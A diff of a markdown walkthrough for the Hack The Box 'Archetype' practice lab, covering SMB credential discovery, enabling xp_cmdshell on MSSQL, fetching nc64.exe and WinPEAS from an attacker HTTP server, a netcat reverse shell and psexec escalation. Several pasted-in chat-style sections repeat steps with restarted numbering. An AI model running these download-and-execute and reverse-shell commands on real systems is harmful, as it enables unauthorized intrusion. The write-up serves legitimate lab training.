@@ -9,6 +9,20 @@ This report documents the completion of the Archetype challenge from Hack The Bo
 - Credential harvesting and lateral movement
 - Command execution via SQL Server
 
+**Difficulty:** Very Easy
+
+**Tools Used:**
+- **Nmap** - Used for initial port scanning and service enumeration
+- **SMBClient** - Used to enumerate and access SMB shares
+- **Impacket** - Used for MSSQL authentication and command execution
+- **WinPEAS** - Used for Windows privilege escalation enumeration
+- **Netcat** - Used to establish reverse shell connections
+
+**Flags to Capture:** 2
+- User Flag: Located in the sql_svc user's desktop directory
+- Root Flag: Located in the Administrator's desktop directory
+
+
 ## Task Breakdown
 
 ### Task 1: Which TCP port is hosting a database server?
@@ -20,9 +34,126 @@ This report documents the completion of the Archetype challenge from Hack The Bo
 nmap -sV -p- --min-rate=1000 10.10.10.x
 ```
 
-This command performs a comprehensive port scan with service version detection, revealing port 1433 running Microsoft SQL Server.
+**Solution:**
+```bash
+nmap -sC -sV {TARGET_IP}
+```
+
+This command performs a comprehensive port scan with service version detection, revealing port 1433 running Microsoft SQL Server 2017.
 
 **Importance:** Identifying open ports and services is the first critical step in penetration testing, allowing us to discover potential attack vectors.
+
+**Flag Captured:** None (information gathering)
+
+# Nmap `-sC` vs `-p-`: Key Differences
+
+## `-sC` (Script Scan)
+
+**What it does:**
+- Runs default Nmap scripts against discovered open ports
+- Equivalent to `--script=default`
+- Performs additional enumeration on services (banner grabbing, version detection, etc.)
+
+**Advantages:**
+- Provides deeper information about services
+- Identifies common vulnerabilities and misconfigurations
+- Automates basic enumeration tasks
+- Faster than running individual scripts manually
+
+**Disadvantages:**
+- Can be noisy and detectable by security systems
+- May trigger alerts or be blocked by firewalls
+- Only runs against default ports unless combined with port specifications
+- Can potentially crash unstable services
+
+## `-p-` (All Ports Scan)
+
+**What it does:**
+- Scans all 65,535 TCP ports (port range 1-65535)
+- By default, Nmap only scans the most common 1,000 ports
+
+**Advantages:**
+- Comprehensive coverage - finds services on non-standard ports
+- Discovers hidden or obscured services
+- Essential for thorough penetration testing
+- Can reveal security through obscurity attempts
+
+**Disadvantages:**
+- Significantly slower than default port scans
+- More network traffic generated
+- More likely to trigger IDS/IPS alerts
+- Can take hours on slow networks or when scanning multiple hosts
+
+## Best Practices
+
+These options serve different purposes and are often used together:
+
+```bash
+# Comprehensive scan with both options
+nmap -sC -sV -p- 10.129.211.161
+
+# Faster two-phase approach
+nmap -sV 10.129.211.161         # Quick scan of common ports
+nmap -sC -sV -p- 10.129.211.161 # Full scan after initial recon
+```
+
+For CTFs like Hack The Box, a common strategy is to start with a quick scan of common ports, then run a comprehensive scan in the background while you begin working with the services you've already discovered.
+
+# Nmap Scan Duration Guidelines
+
+The time you should wait for Nmap to complete depends on several factors:
+
+## Typical Scan Times
+
+- **Default scan** (`nmap <target>`): 2-5 minutes
+- **Service version scan** (`nmap -sV <target>`): 5-10 minutes
+- **Script scan** (`nmap -sC <target>`): 5-15 minutes
+- **All ports scan** (`nmap -p- <target>`): 15-60+ minutes
+- **Comprehensive scan** (`nmap -sC -sV -p- <target>`): 30-90+ minutes
+
+## Factors Affecting Duration
+
+1. **Network conditions**: Latency, packet loss, and bandwidth limitations
+2. **Target responsiveness**: Firewalls, rate limiting, or slow services
+3. **Scan options**: More aggressive options take longer
+4. **Number of open ports**: More open ports = more service detection time
+5. **Target hardware**: Virtual machines or resource-constrained targets respond slower
+
+## Best Practices
+
+- **Use timing templates** for faster scans: `nmap -T4 <target>`
+- **Increase minimum rate**: `nmap --min-rate=1000 -p- <target>`
+- **Run in phases**:
+  ```bash
+  # Quick scan first
+  nmap -T4 -F <target>
+  
+  # Then comprehensive scan in background
+  nmap -sC -sV -p- <target> -oN full_scan.txt &
+  ```
+- **Set a reasonable timeout**: `nmap --host-timeout 30m <target>`
+
+## When to Stop a Scan
+
+- If a scan has been running for over 2 hours with no progress
+- If you're seeing many "giving up on port" messages
+- If you've already found the information you need
+
+For CTF challenges like Hack The Box, a good approach is to start working with the ports you've already discovered while letting a comprehensive scan run in the background.
+
+```bash
+nmap -sC -sV 10.129.211.161                                                                                      
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 20:32 MDT
+Nmap scan report for 10.129.211.161
+Host is up (0.074s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+```
+
 
 #### Troubleshooting Common Issues
 
@@ -144,15 +275,20 @@ This is valuable information because it shows you can proceed with connecting to
 
 **Solution:**
 ```bash
-smbclient \\\\10.10.10.x\\backups -N
+smbclient -N \\\\{TARGET_IP}\\backups
 get prod.dtsConfig
 exit
-```
-this command downloads the configuration file from the SMB share. Go to the directory where the file was downloaded and view its contents with:
-
-```bash
 cat prod.dtsConfig
 ```
+
+These commands connect to the backups share, download the configuration file, and reveal credentials stored in plaintext:
+- Username: ARCHETYPE\sql_svc
+- Password: M3g4c0rp123
+
+**Importance:** This demonstrates how improper credential storage can lead to security breaches, as sensitive information is often left in configuration files.
+
+**Flag Captured:** None (credential discovery)
+
 the contents of the file will look like this:
 
 ```bash
@@ -199,6 +335,9 @@ This finding demonstrates a common security mistake: storing sensitive credentia
 These commands connect to the backups share, download the configuration file, and reveal credentials stored in plaintext.
 
 **Importance:** This demonstrates how improper credential storage can lead to security breaches, as sensitive information is often left in configuration files.
+
+**Note**
+the `-N` flag is used to connect without a password, which is appropriate for this share.
 
 **Troubleshooting Common Issues**
 
@@ -247,6 +386,12 @@ This indicates a connection timeout when trying to connect to the "backups" shar
 ```bash
 mssqlclient.py ARCHETYPE/sql_svc:Password123@10.10.10.x -windows-auth
 ```
+This command uses Impacket's mssqlclient.py script to authenticate to the MSSQL server using the discovered credentials.
+
+**Importance:** This demonstrates how to leverage discovered credentials to access database services, which can often lead to further system compromise.
+
+**Flag Captured:** None (gaining access)
+
 This Impacket script allows for authenticated connections to MSSQL servers using the credentials discovered in the previous step.
 
 **Importance:** Understanding specialized tools for database access is crucial for penetration testing against database servers.
@@ -349,13 +494,107 @@ This is a common issue when working with penetration testing tools, as many spec
 
 **Solution:**
 
+
+```sql
+SELECT is_srvrolemember('sysadmin');
+```
+```sql
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+```
 ```sql
 EXEC xp_cmdshell 'whoami'
 ```
 
-The xp_cmdshell extended stored procedure allows execution of operating system commands from within SQL Server.
+The xp_cmdshell extended stored procedure allows execution of operating system commands from within SQL Server. If not enabled, it can be activated with:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
 
 **Importance:** This highlights how misconfigured database servers can be leveraged to gain command execution on the underlying operating system.
+
+**Flag Captured:** None (privilege escalation technique)
+
+The `EXEC xp_cmdshell` command is executed within a Microsoft SQL Server session, not through SMB. Here's a step-by-step guide to clarify the process:
+
+## Complete Process
+
+1. **First, enumerate SMB shares to find the backups share**:
+   ```bash
+   smbclient -L \\\\10.129.211.161\\
+   ```
+
+2. **Access the backups share to get credentials**:
+   ```bash
+   smbclient \\\\10.129.211.161\\backups
+   ```
+   When prompted for a password, just press Enter (null password)
+
+3. **Download and view the config file**:
+   ```
+   smb: \> get prod.dtsConfig
+   smb: \> exit
+   cat prod.dtsConfig
+   ```
+   This reveals SQL credentials (ARCHETYPE\sql_svc:M3g4c0rp123)
+
+4. **Connect to the SQL Server using the credentials**:
+   ```bash
+   impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.211.161 -windows-auth
+   ```
+   If the command isn't found, you might need to install Impacket or use the full path
+
+5. **Now you can execute xp_cmdshell within the SQL session**:
+   ```sql
+   SQL> EXEC sp_configure 'show advanced options', 1;
+   SQL> RECONFIGURE;
+   SQL> EXEC sp_configure 'xp_cmdshell', 1;
+   SQL> RECONFIGURE;
+   SQL> EXEC xp_cmdshell 'whoami';
+   ```
+
+```bash
+EXEC xp_cmdshell 'whoami';
+output
+-----------------
+archetype\sql_svc
+
+NULL
+
+```
+
+## Troubleshooting
+
+If `smbclient \\\\10.129.211.161\\backups` doesn't work, try:
+
+1. **Check your syntax**:
+   ```bash
+   smbclient //10.129.211.161/backups -N
+   ```
+   The `-N` flag means no password
+
+2. **Try with explicit SMB version**:
+   ```bash
+   smbclient //10.129.211.161/backups -N --option='client min protocol=SMB2'
+   ```
+
+3. **If Impacket isn't installed**:
+   ```bash
+   sudo apt install python3-impacket
+   # Or
+   pip install impacket
+   ```
+
+Remember, `xp_cmdshell` is executed within the SQL Server session after you've connected with the credentials found in the config file, not directly through SMB.
+
 
 ### Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?
 
@@ -365,15 +604,192 @@ The xp_cmdshell extended stored procedure allows execution of operating system c
 
 WinPEAS (Windows Privilege Escalation Awesome Scripts) is a powerful enumeration script that automatically searches for possible privilege escalation paths on Windows systems.
 
-```bash
-# First, set up a listener on the attack machine
-nc -lvnp 4444
 
-# Then, using xp_cmdshell, download and execute WinPEAS
-EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.x/winPEAS.ps1''); Invoke-WinPEAS"'
+```bash
+# Transfer WinPEAS to the target
+powershell
+wget http://{ATTACKER_IP}/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64.exe
 ```
 
 **Importance:** Automated privilege escalation scripts are essential for efficiently identifying potential escalation paths in complex Windows environments.
+
+**Flag Captured:** None (privilege escalation technique)
+
+# Using WinPEAS for Privilege Escalation
+
+Let me explain in detail how to use WinPEAS for privilege escalation on the Windows server:
+
+## 1. What is WinPEAS?
+
+WinPEAS (Windows Privilege Escalation Awesome Script) is a tool that automatically searches for possible privilege escalation paths on Windows systems. It checks for:
+- Misconfigurations
+- Vulnerable services
+- Stored credentials
+- Weak permissions
+- And many other privilege escalation vectors
+
+## 2. Getting WinPEAS to the Target
+
+First, you need to download WinPEAS on your attack machine and then transfer it to the target:
+
+```bash
+# On your attack machine
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20230423/winPEASx64.exe
+```
+
+Then set up a simple HTTP server on your attack machine:
+
+```bash
+python3 -m http.server 80
+```
+# Uploading nc64.exe to the Target Machine
+
+You're right - we need to upload nc64.exe to the target machine before we can use it. Here's how to do it step by step:
+
+## 1. Prepare Your Attack Machine
+
+You've already done these steps:
+- You have nc64.exe in ~/htb/archetype/nc64.exe
+- You've started a Python HTTP server with `sudo python3 -m http.server 80`
+
+## 2. Upload nc64.exe Using xp_cmdshell
+
+Now, you need to use the SQL Server's xp_cmdshell to download the file from your HTTP server to the target machine:
+
+```sql
+-- In your SQL Server session (where you're already connected with impacket-mssqlclient)
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/nc64.exe -outfile nc64.exe"
+```
+
+Replace YOUR_IP_ADDRESS with your attack machine's IP address (your HTB VPN IP, not 127.0.0.1).
+
+## 3. Verify the Upload
+
+You can verify that the file was uploaded successfully:
+
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; dir"
+```
+
+You should see nc64.exe in the directory listing.
+
+## 4. Set Up a Netcat Listener
+
+In a new terminal on your attack machine, start a netcat listener:
+
+```bash
+sudo nc -lvnp 443
+```
+
+## 5. Execute the Reverse Shell
+
+Now, use xp_cmdshell to execute nc64.exe and establish a reverse shell:
+
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe YOUR_IP_ADDRESS 443"
+```
+
+Again, replace YOUR_IP_ADDRESS with your attack machine's IP address.
+
+## 6. Check Your Netcat Listener
+
+If everything worked correctly, you should now have a command shell on your netcat listener. You can verify this by running commands like:
+
+```cmd
+whoami
+hostname
+ipconfig
+```
+
+## Troubleshooting
+
+If you're having issues:
+
+1. **Check your HTTP server logs** - You should see GET requests for nc64.exe
+2. **Verify your IP address** - Make sure you're using your VPN IP, not localhost
+3. **Check for firewall issues** - Try different ports if 443 is blocked
+4. **Verify PowerShell execution** - Try a simple command first:
+   ```sql
+   EXEC xp_cmdshell "powershell -c echo 'Test'"
+   ```
+
+Remember, you're using the SQL Server as a conduit to execute PowerShell commands, which in turn download and execute nc64.exe to establish a reverse shell back to your machine.
+
+
+## 3. Transferring WinPEAS to the Target
+
+Now, you need to download WinPEAS onto the target machine. You'll do this using the SQL Server xp_cmdshell you've already accessed:
+
+```sql
+-- In your SQL Server session
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/winPEASx64.exe -outfile winPEASx64.exe"
+```
+
+Replace YOUR_IP_ADDRESS with your attack machine's IP address.
+
+## 4. Running WinPEAS on the Target
+
+You have two options to run WinPEAS:
+
+### Option 1: Run directly through xp_cmdshell
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\winPEASx64.exe"
+```
+
+However, this might not show all output clearly due to SQL Server's output limitations.
+
+### Option 2: Get a proper shell first (recommended)
+
+Set up a netcat listener on your attack machine:
+```bash
+nc -lvnp 443
+```
+
+Then use xp_cmdshell to establish a reverse shell:
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://YOUR_IP_ADDRESS/nc64.exe -outfile nc64.exe"
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe YOUR_IP_ADDRESS 443"
+```
+
+Once you have a shell, run WinPEAS:
+```cmd
+cd C:\Users\sql_svc\Downloads
+.\winPEASx64.exe
+```
+
+## 5. Finding Privilege Escalation Vectors
+
+WinPEAS will output a lot of information. In this specific CTF, it will help identify that PowerShell history files might contain sensitive information.
+
+Check the PowerShell history file:
+```cmd
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+This reveals the Administrator password: `MEGACORP_4dm1n!!`
+
+## 6. Escalating Privileges
+
+Now that you have the Administrator password, you can use it to gain administrative access:
+
+```bash
+# On your attack machine
+impacket-psexec ARCHETYPE/administrator:MEGACORP_4dm1n!!@10.129.211.161
+```
+
+This gives you a SYSTEM-level shell, effectively completing the privilege escalation.
+
+## 7. Capturing the Root Flag
+
+With administrative access, you can now capture the root flag:
+```cmd
+cd C:\Users\Administrator\Desktop
+type root.txt
+```
+
+The key insight here is that WinPEAS helps automate the discovery of privilege escalation vectors, but you still need to exploit those vectors manually. In this case, it helps point you toward checking PowerShell history files, which contain the administrator credentials.
+
 
 ### Task 7: What file contains the administrator's password?
 
@@ -381,13 +797,171 @@ EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''
 
 **Solution:**
 ```bash
-# Using xp_cmdshell to search for interesting files
-EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
+# First, set up a Python HTTP server on the attack machine
+python3 -m http.server 80
+
+# Then, set up a netcat listener
+nc -lvnp 443
+
+# Using xp_cmdshell, download netcat to the target
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{ATTACKER_IP}/nc64.exe -outfile nc64.exe"
+
+# Establish a reverse shell
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {ATTACKER_IP} 443"
+
+# Once the shell is established, navigate to the Desktop and read the user flag
+cd C:\Users\sql_svc\Desktop
+type user.txt
 ```
 
-The PowerShell history file contains previously executed commands, including those with administrator credentials.
+**Importance:** This demonstrates the complete attack chain from initial access to user compromise, utilizing command execution to establish a reverse shell.
 
-**Importance:** This demonstrates the importance of proper credential handling and the risks of leaving command history files accessible.
+**Flag Captured:** User Flag (actual value redacted)
+
+# Understanding the `nc -lvnp 443` Command
+
+The command `sudo nc -lvnp 443` sets up a netcat listener on your attack machine, which is essential for receiving the reverse shell connection from the target. Let me explain what this does and why it's important:
+
+## What is this command?
+
+`sudo nc -lvnp 443` breaks down as:
+
+- `sudo`: Run with elevated privileges (needed to bind to port 443)
+- `nc`: The netcat utility, a versatile networking tool
+- `-l`: Listen mode (instead of connecting to a remote host)
+- `-v`: Verbose output (shows more details about the connection)
+- `-n`: Skip DNS resolution (use IP addresses directly)
+- `-p 443`: Listen on port 443 (HTTPS port, often allowed through firewalls)
+
+## Why run this before executing nc64.exe on the target?
+
+1. **Establishes the receiving end**: The reverse shell needs somewhere to connect back to. This command creates that endpoint.
+
+2. **Timing is critical**: You must have the listener running BEFORE executing the reverse shell command on the target. Otherwise, when the target tries to connect back, there will be nothing listening and the connection will fail.
+
+3. **Order of operations**:
+   - First, set up the listener on your attack machine
+   - Then, execute the reverse shell command on the target
+   - The target connects back to your listener
+   - You now have interactive command-line access to the target
+
+## What happens when it works?
+
+When you run `sudo nc -lvnp 443`, you'll see output like:
+```
+listening on [any] 443 ...
+```
+
+After executing the reverse shell command on the target, you'll see:
+```
+connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] 49152
+```
+
+Then your terminal will show a Windows command prompt, indicating you have shell access to the target machine.
+
+## Why port 443?
+
+Port 443 (HTTPS) is commonly used for reverse shells because:
+- It's often allowed through firewalls for outbound connections
+- It blends in with normal HTTPS traffic
+- Most environments don't block outbound HTTPS
+
+This is why the writeup specifies running the listener first - it's a critical step in the process of establishing a reverse shell connection.
+
+# Finding Your Attacker IP Address
+
+Yes, you're correct - the "attacker IP" is your own IP address in this scenario. Here's how to find it:
+
+## For HTB VPN Connection
+
+Since you're working on a Hack The Box machine, you need to use your VPN IP address (the one assigned to you when you connected to the HTB VPN):
+
+```bash
+# Check your tun0 interface (HTB VPN)
+ip addr show tun0
+```
+10.10.14.26/23
+Look for the `inet` line which shows something like:
+```
+inet 10.10.XX.XX/23 scope global tun0
+```
+
+That 10.10.XX.XX is your HTB VPN IP address.
+
+## Alternative Methods
+
+If the above doesn't work, try these:
+
+```bash
+# Option 1: ifconfig with grep
+ifconfig | grep -A 1 tun0
+
+# Option 2: Just the IP address
+ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+
+# Option 3: Check all interfaces
+ip -4 addr
+```
+
+## Important Notes
+
+1. **Do NOT use**:
+   - 127.0.0.1 (localhost)
+   - Your local network IP (192.168.x.x)
+   - Your public internet IP
+
+2. **The target machine must be able to reach your IP**:
+   - This is why we use the VPN IP - it creates a direct connection between you and the target
+
+3. **Verify connectivity**:
+   - You can test if your HTTP server is accessible by running:
+     ```bash
+     curl http://YOUR_VPN_IP:80
+     ```
+     from another terminal on your machine
+
+When you replace "YOUR_IP_ADDRESS" in the commands, use this VPN IP address. For example:
+
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.26/nc64.exe -outfile nc64.exe"
+```
+
+And for the reverse shell:
+
+```sql
+EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.26 443"
+```
+### Task 8: Capture the Root Flag
+
+**Solution:**
+```bash
+# Check PowerShell history for credentials
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Use discovered Administrator credentials with Impacket's psexec.py
+python3 psexec.py administrator@{TARGET_IP}
+
+# Navigate to Administrator's desktop and read the root flag
+cd C:\Users\Administrator\Desktop
+type root.txt
+```
+The PowerShell history file reveals the Administrator password: MEGACORP_4dm1n!!
+
+**Importance:** This demonstrates the importance of proper credential handling and the risks of leaving command history files accessible, as well as how to leverage discovered credentials for privilege escalation.
+
+**Flag Captured:** Root Flag (actual value redacted)
+
+## Summary
+
+This CTF challenge provided hands-on experience with Windows server penetration testing. The most valuable lessons from this exercise include:
+
+1. The importance of thorough enumeration of network services
+2. How insecure file storage can lead to credential exposure
+3. Leveraging database server misconfigurations for command execution
+4. Using PowerShell history files for post-exploitation intelligence gathering
+5. The critical nature of proper credential management
+
+These skills are directly applicable to real-world scenarios such as internal network penetration tests and security assessments of Windows-based environments.
 
 ## Appendix: Command Outputs
 
